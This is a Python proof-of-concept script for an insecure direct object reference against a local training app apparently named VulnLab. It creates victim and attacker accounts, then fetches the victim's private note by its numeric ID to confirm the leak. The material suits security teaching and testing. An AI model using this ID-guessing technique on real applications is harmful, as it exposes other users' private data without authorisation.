import re
from uuid import uuid4

import requests


BASE_URL = "http://127.0.0.1:5000"
TIMEOUT = 5


def send(session, method, path, **kwargs):
    response = session.request(method, f"{BASE_URL}{path}", timeout=TIMEOUT, **kwargs,)
    response.raise_for_status()
    return response


def register_and_login(session, username, password):
    registration = send(session,
        "POST", "/auth/register",
        data={
            "username": username,
            "password": password,
        },
    )

    if "already registered" in registration.text:
        raise RuntimeError(f"Username collision: {username}")

    login = send(session,
        "POST", "/auth/login",
        data={
            "username": username,
            "password": password,
        },
    )

    if username not in login.text:
        raise RuntimeError(f"Login failed for {username}")


def extract_note_id(page, note_title):
    pattern = (
        rf'href="/notes/(\d+)">\s*'
        rf"{re.escape(note_title)}\s*</a>"
    )

    match = re.search(pattern, page)

    if match is None:
        raise RuntimeError("Could not identify the victim note ID")

    return int(match.group(1))


def main():
    suffix = uuid4().hex[:8]

    victim_username = f"victim_{suffix}"
    attacker_username = f"attacker_{suffix}"
    password = "local-demo-password"

    victim_title = f"Private Record {suffix}"
    evidence_marker = f"FAKE-IDOR-EVIDENCE-{suffix}"

    health = requests.get(
        f"{BASE_URL}/health",
        timeout=TIMEOUT,
    )
    health.raise_for_status()

    print("[+] VulnLab health check passed")

    with requests.Session() as victim:
        register_and_login(victim, victim_username, password,)

        created = send(victim,
            "POST", "/notes/create",
            data={
                "title": victim_title,
                "body": evidence_marker,
            },
        )

        victim_note_id = extract_note_id(
            created.text,
            victim_title,
        )

    print(
        f"[+] Created fictional victim note at "
        f"/notes/{victim_note_id}"
    )

    with requests.Session() as attacker:
        register_and_login(attacker, attacker_username, password,)

        attacker_index = send(attacker,
            "GET", "/notes/",
        )

        if victim_title in attacker_index.text:
            raise RuntimeError(
                "Victim note unexpectedly appeared in attacker index"
            )

        print("[+] Attacker note index did not show victim note")

        exploit = send(attacker,
            "GET", f"/notes/{victim_note_id}",
        )

        if evidence_marker not in exploit.text:
            raise RuntimeError(
                "Direct object request did not expose the victim marker"
            )

    print("[+] IDOR confirmed")
    print(f"    Requested object: /notes/{victim_note_id}")
    print(f"    Leaked marker: {evidence_marker}")

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except requests.RequestException as error:
        print(f"[-] HTTP request failed: {error}")
        raise SystemExit(1)
    except RuntimeError as error:
        print(f"[-] PoC failed: {error}")
        raise SystemExit(1)